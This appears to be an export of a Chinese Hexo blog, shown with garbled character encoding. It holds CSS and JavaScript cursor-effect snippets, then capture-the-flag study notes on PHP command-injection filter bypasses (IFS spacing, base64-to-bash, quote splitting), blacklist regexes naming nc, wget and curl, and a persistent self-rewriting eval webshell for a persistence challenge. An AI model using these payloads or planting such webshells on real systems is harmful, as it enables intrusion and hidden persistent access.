<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!function(e,t,a)&#123;function n()&#123;c(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function o()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function s()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨ <strong>\themes\next\layout_layout.njk</strong> æ–‡ä»¶æœ«å°¾æ·»åŠ ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- é¡µé¢ç‚¹å‡»å°çº¢å¿ƒ --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clicklove.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="é¼ æ ‡è·Ÿéšç‰¹æ•ˆ"><a href="#é¼ æ ‡è·Ÿéšç‰¹æ•ˆ" class="headerlink" title="é¼ æ ‡è·Ÿéšç‰¹æ•ˆ"></a>é¼ æ ‡è·Ÿéšç‰¹æ•ˆ</h1><p><a href="https://sweetolive.github.io/2020/07/17/1/">Hexo nextä¸»é¢˜æ·»åŠ é¼ æ ‡ç‰¹æ•ˆ | ä½˜ä¸€äºº (sweetolive.github.io)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function cherry() &#123;</span><br><span class="line">  var possibleColors = [&quot;#D61C59&quot;, &quot;#E7D84B&quot;, &quot;#1B8798&quot;]</span><br><span class="line">  var width = window.innerWidth;</span><br><span class="line">  var height = window.innerHeight;</span><br><span class="line">  var cursor = &#123;x: width/2, y: width/2&#125;;</span><br><span class="line">  var particles = [];</span><br><span class="line">  </span><br><span class="line">  function init() &#123;</span><br><span class="line">    bindEvents();</span><br><span class="line">    loop();</span><br><span class="line">  &#125;  </span><br><span class="line">  // Bind events that are needed</span><br><span class="line">  function bindEvents() &#123;</span><br><span class="line">    document.addEventListener(&#x27;mousemove&#x27;, onMouseMove);</span><br><span class="line">    document.addEventListener(&#x27;touchmove&#x27;, onTouchMove);</span><br><span class="line">    document.addEventListener(&#x27;touchstart&#x27;, onTouchMove);</span><br><span class="line">    </span><br><span class="line">    window.addEventListener(&#x27;resize&#x27;, onWindowResize);</span><br><span class="line">  &#125;  </span><br><span class="line">  function onWindowResize(e) &#123;</span><br><span class="line">    width = window.innerWidth;</span><br><span class="line">    height = window.innerHeight;</span><br><span class="line">  &#125; </span><br><span class="line">  function onTouchMove(e) &#123;</span><br><span class="line">    if( e.touches.length &gt; 0 ) &#123;</span><br><span class="line">      for( var i = 0; i &lt; e.touches.length; i++ ) &#123;</span><br><span class="line">        addParticle( e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function onMouseMove(e) &#123;    </span><br><span class="line">    cursor.x = e.clientX;</span><br><span class="line">    cursor.y = e.clientY;</span><br><span class="line">    </span><br><span class="line">    addParticle( cursor.x, cursor.y, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">  &#125;</span><br><span class="line">  function addParticle(x, y, color) &#123;</span><br><span class="line">    var particle = new Particle();</span><br><span class="line">    particle.init(x, y, color);</span><br><span class="line">    particles.push(particle);</span><br><span class="line">  &#125;</span><br><span class="line">  function updateParticles() &#123;</span><br><span class="line">    for( var i = 0; i &lt; particles.length; i++ ) &#123;</span><br><span class="line">      particles[i].update();</span><br><span class="line">    &#125;</span><br><span class="line">    for( var i = particles.length -1; i &gt;= 0; i-- ) &#123;</span><br><span class="line">      if( particles[i].lifeSpan &lt; 0 ) &#123;</span><br><span class="line">        particles[i].die();</span><br><span class="line">        particles.splice(i, 1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function loop() &#123;</span><br><span class="line">    requestAnimationFrame(loop);</span><br><span class="line">    updateParticles();</span><br><span class="line">  &#125;</span><br><span class="line">  function Particle() &#123;</span><br><span class="line">    this.character = &quot;*&quot;;</span><br><span class="line">    this.lifeSpan = 120; //ms</span><br><span class="line">    this.initialStyles =&#123;</span><br><span class="line">      &quot;position&quot;: &quot;fixed&quot;,</span><br><span class="line">      &quot;top&quot;: &quot;0&quot;, //å¿…é¡»åŠ </span><br><span class="line">      &quot;display&quot;: &quot;block&quot;,</span><br><span class="line">      &quot;pointerEvents&quot;: &quot;none&quot;,</span><br><span class="line">      &quot;z-index&quot;: &quot;10000000&quot;,</span><br><span class="line">      &quot;fontSize&quot;: &quot;20px&quot;,</span><br><span class="line">      &quot;will-change&quot;: &quot;transform&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    this.init = function(x, y, color) &#123;</span><br><span class="line">      this.velocity = &#123;</span><br><span class="line">        x:  (Math.random() &lt; 0.5 ? -1 : 1) * (Math.random() / 2),</span><br><span class="line">        y: 1</span><br><span class="line">      &#125;;</span><br><span class="line">      this.position = &#123;x: x - 10, y: y - 20&#125;;</span><br><span class="line">      this.initialStyles.color = color;</span><br><span class="line">      console.log(color);</span><br><span class="line"></span><br><span class="line">      this.element = document.createElement(&#x27;span&#x27;);</span><br><span class="line">      this.element.innerHTML = this.character;</span><br><span class="line">      applyProperties(this.element, this.initialStyles);</span><br><span class="line">      this.update();</span><br><span class="line">      </span><br><span class="line">      document.body.appendChild(this.element);</span><br><span class="line">    &#125;;</span><br><span class="line">    this.update = function() &#123;</span><br><span class="line">      this.position.x += this.velocity.x;</span><br><span class="line">      this.position.y += this.velocity.y;</span><br><span class="line">      this.lifeSpan--;</span><br><span class="line">      this.element.style.transform = &quot;translate3d(&quot; + this.position.x + &quot;px,&quot; + this.position.y + &quot;px,0) scale(&quot; + (this.lifeSpan / 120) + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    this.die = function() &#123;</span><br><span class="line">      this.element.parentNode.removeChild(this.element);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function applyProperties( target, properties ) &#123;</span><br><span class="line">    for( var key in properties ) &#123;</span><br><span class="line">      target.style[ key ] = properties[ key ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  init();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="åœ¨themes-next-layoutæ–°å»ºæ–‡ä»¶å¤¹-custom"><a href="#åœ¨themes-next-layoutæ–°å»ºæ–‡ä»¶å¤¹-custom" class="headerlink" title="åœ¨themes\next\layoutæ–°å»ºæ–‡ä»¶å¤¹_custom"></a>åœ¨themes\next\layoutæ–°å»ºæ–‡ä»¶å¤¹_custom</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.cursor_effect %&#125;</span><br><span class="line">  &#123;%- if theme.cursor_effect.type == &quot;explosion&quot; %&#125;</span><br><span class="line">    &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;script src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/explosion.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- elseif theme.cursor_effect.type == &quot;cherry&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/cherry.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åœ¨themes-next-layoutä¸‹æ‰¾åˆ°-layout-swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç "><a href="#åœ¨themes-next-layoutä¸‹æ‰¾åˆ°-layout-swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç " class="headerlink" title="åœ¨themes\next\layoutä¸‹æ‰¾åˆ°_layout.swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç "></a>åœ¨themes\next\layoutä¸‹æ‰¾åˆ°_layout.swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% include &#x27;_custom/custom.swig&#x27; %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶-config-ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ"><a href="#æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶-config-ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ" class="headerlink" title="æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ"></a>æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cherry: æ¨±èŠ± | explosionï¼šçˆ†ç‚¸ </span><br><span class="line">cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  type: cherry </span><br></pre></td></tr></table></figure>

<h2 id="è®¾ç½®é€æ˜åº¦"><a href="#è®¾ç½®é€æ˜åº¦" class="headerlink" title="è®¾ç½®é€æ˜åº¦"></a>è®¾ç½®é€æ˜åº¦</h2><p>å•ç‹¬ç»™æ¯ä¸ªåŒºåŸŸè®¾ç½®opacityä¼šå‡ºç°å¾ˆå¤šé—®é¢˜ï¼Œä¾‹å¦‚æœç´¢æ¡†å¼¹å‡ºä¼šè¢«è¦†ç›–å›¾å±‚å¯¼è‡´æ— æ³•è¿›è¡Œæœ¬åœ°æœç´¢</p>
<p>æœ€ç†æƒ³æ˜¯è¿›è¡Œå…¨å±€è®¾ç½®ï¼Œåœ¨ <code>blog\source\_data\styles.styl</code> ä¸­ ç›´æ¥è®¾ç½®bodyçš„é€æ˜åº¦ä¸º0.85 å…¨ä½“é€æ˜åŒ–ï¼Œopacityçš„å€¼å¯ä»¥è‡ªè¡Œè°ƒæ•´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//èƒŒæ™¯å›¾ç‰‡è®¾ç½®</span><br><span class="line">body &#123;</span><br><span class="line">    background-image: url(/images/bg1.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment: fixed;</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    opacity: 0.85;</span><br><span class="line">    //å¯é€‰</span><br><span class="line">    +mobile()&#123;</span><br><span class="line">      background-image: url(https://ziyuan.lruihao.cn/images/bg_cell.png);</span><br><span class="line">      background-size: cover;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="æ¨±èŠ±é£˜è½ç‰¹æ•ˆ"><a href="#æ¨±èŠ±é£˜è½ç‰¹æ•ˆ" class="headerlink" title="æ¨±èŠ±é£˜è½ç‰¹æ•ˆ"></a>æ¨±èŠ±é£˜è½ç‰¹æ•ˆ</h1><p><a href="https://bobboss.github.io/posts/ac603ad1.html">æ¨±èŠ±é£˜è½ç‰¹æ•ˆ | BobBoss Blog</a></p>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
      <tags>
        <tag>åšå®¢</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡ŒæŠ€å·§</title>
    <url>/2023/01/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>phpçš„includeå¯ä»¥è½½å…¥ä¸€ä¸ªå¤–éƒ¨phpæ–‡ä»¶ï¼Œå…¶å‚æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œæ—¢ç„¶æ˜¯æ–‡ä»¶åï¼Œå°±ä¸èƒ½å¸¦å‚æ•°äº†ã€‚</p>
<p>phpä¸­ï¼Œå¦‚æœincludeè½½å…¥çš„æ–‡ä»¶ä¸€å®šè¦å¸¦å‚æ•°ï¼Œå°±åªæœ‰ä¸€ç§åŠæ³•ï¼Œå³è¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…¨è·¯å¾„çš„URLåœ°å€ã€‚</p>
<span id="more"></span>

<p>windows ä¸‹</p>
<blockquote>
<p><code>|</code>ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥<br><code>||</code>å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥<br><code>&amp;</code>å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br><code>&amp;&amp;</code>å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</p>
</blockquote>
<p>Linux ä¸‹</p>
<blockquote>
<p><code>;</code>å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br><code>|</code>ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥<br><code>||</code>å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥<br><code>&amp;</code>å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br><code>&amp;&amp;</code>å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</p>
<h1 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h1><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` é‡å®šå‘ç¬¦</span><br><span class="line">`%09`(éœ€è¦phpç¯å¢ƒ)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9` //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ</span><br><span class="line">`&#123;cat,flag.php&#125;` //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<p>æ‰§è¡Œä»£ç å‡½æ•°</p>
<p><code>eval()</code><br><code>assert()</code><br><code>preg_replace()</code><br><code>create_function()</code><br><code>array_map()</code><br><code>call_user_func()</code><br><code>call_user_func_array()</code><br><code>array_filter</code><br><code>usort</code><br><code>uasort()</code></p>
<p>${}:ä¸­é—´çš„phpä»£ç å°†ä¼šè¢«è§£æ</p>
<p>å‘½ä»¤æ‰§è¡Œå‡½æ•°</p>
<p>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p>
<p>PHP æ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦ï¼šåå¼•å·ï¼ˆ&#96;ï¼‰ã€‚æ³¨æ„è¿™ä¸æ˜¯å•å¼•å·ï¼PHP    å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€œâ€çš„æ•ˆæœä¸å‡½æ•°    shell_exec() ç›¸åŒã€‚</p>
<ul>
<li><p>æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>æ–‡ä»¶è¯»å–å‡½æ•°ï¼š</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
</li>
</ul>
<h1 id="catè¢«è¿‡æ»¤"><a href="#catè¢«è¿‡æ»¤" class="headerlink" title="catè¢«è¿‡æ»¤"></a>catè¢«è¿‡æ»¤</h1><blockquote>
<p>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br>head:æŸ¥çœ‹å¤´å‡ è¡Œ<br>tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>tail:æŸ¥çœ‹å°¾å‡ è¡Œ<br>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>sort:å¯ä»¥æŸ¥çœ‹<br>uniq:   &#x2F;&#x2F; uniq å‘½ä»¤ç”¨äºæ£€æŸ¥åŠåˆ é™¤æ–‡æœ¬æ–‡ä»¶ä¸­é‡å¤å‡ºç°çš„è¡Œåˆ—<br>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</p>
<h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><p>æ‹¼æ¥</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br></pre></td></tr></table></figure>
</blockquote>
<p>base64ç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash //cat flag</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash   //cat /flag</span><br></pre></td></tr></table></figure>

<p>æƒ…å†µä¸‹å¯å°è¯•sh)</p>
<p>å•å¼•å·ã€åŒå¼•å·</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>åæ–œçº¿</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>æ­£åˆ™ (å‡è®¾&#x2F;bin&#x2F;cat: test: æ˜¯ä¸€ä¸ªç›®å½•)</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;`</span><br><span class="line">`/???/?at ????`</span><br><span class="line">`/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">cat *     #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<p><strong>â€œ.&#x2F;â€œï¼šä»£è¡¨ç›®å‰æ‰€åœ¨çš„ç›®å½•ã€‚</strong></p>
<p><strong>â€œ . .&#x2F;â€œä»£è¡¨ä¸Šä¸€å±‚ç›®å½•ã€‚</strong></p>
<p><strong>â€œ&#x2F;â€œï¼šä»£è¡¨æ ¹ç›®å½•ã€‚</strong></p>
<p>web135æ— å›æ˜¾ï¼Œå‘½ä»¤é•¿åº¦é™åˆ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;ls;  //ç›¸å½“äºæ‰§è¡Œ</span><br><span class="line">eval(`$F` ;);</span><br><span class="line">``$F` ;ls;`</span><br></pre></td></tr></table></figure>

<p>å¦è§£cpå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure>

<p> mv source_file(æ–‡ä»¶) dest_file(æ–‡ä»¶)</p>
<p>å°†æºæ–‡ä»¶å source_file æ”¹ä¸ºç›®æ ‡æ–‡ä»¶å dest_file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /|tee 1</span><br><span class="line">?c=nl /f149_15_h3r3|tee 1</span><br><span class="line">?c=awk &#x27;/f/&#x27; /f149_15_h3r3|tee 1 // awk -f [file] è°ƒç”¨è„šæœ¬</span><br></pre></td></tr></table></figure>

<p>awk å‘½ä»¤ä¹Ÿæ˜¯é€è¡Œæ‰«ææ–‡ä»¶ï¼ˆä»ç¬¬ 1 è¡Œåˆ°æœ€åä¸€è¡Œï¼‰ï¼Œå¯»æ‰¾å«æœ‰ç›®æ ‡æ–‡æœ¬çš„è¡Œï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™ä¼šåœ¨è¯¥è¡Œä¸Šæ‰§è¡Œç”¨æˆ·æƒ³è¦çš„æ“ä½œï¼›åä¹‹ï¼Œåˆ™ä¸å¯¹è¡Œåšä»»ä½•å¤„ç†</p>
<p>ä»è„šæœ¬æ–‡ä»¶ä¸­è¯»å– awk è„šæœ¬æŒ‡ä»¤ï¼Œä»¥å–ä»£ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥æŒ‡ä»¤</p>
<p>Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>æƒé™ç»´æŒ</title>
    <url>/2023/05/03/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[<p>  æƒé™ç»´æŒ</p>
<span id="more"></span>

<h2 id="web670-web676"><a href="#web670-web676" class="headerlink" title="web670-web676"></a>web670-web676</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é¢˜ç›®è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment">// æƒ³åŠæ³•ç»´æŒæƒé™ï¼Œç¡®å®šæ— è¯¯åæäº¤checkï¼Œé€šè¿‡checkåï¼Œæ‰ä¼šç”Ÿæˆflagï¼Œæ­¤å‰flagä¸å­˜åœ¨</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://checker/api/check&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;params not validate&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç§å…¥ä¸æ­»é©¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸€ä¸‹</p>
]]></content>
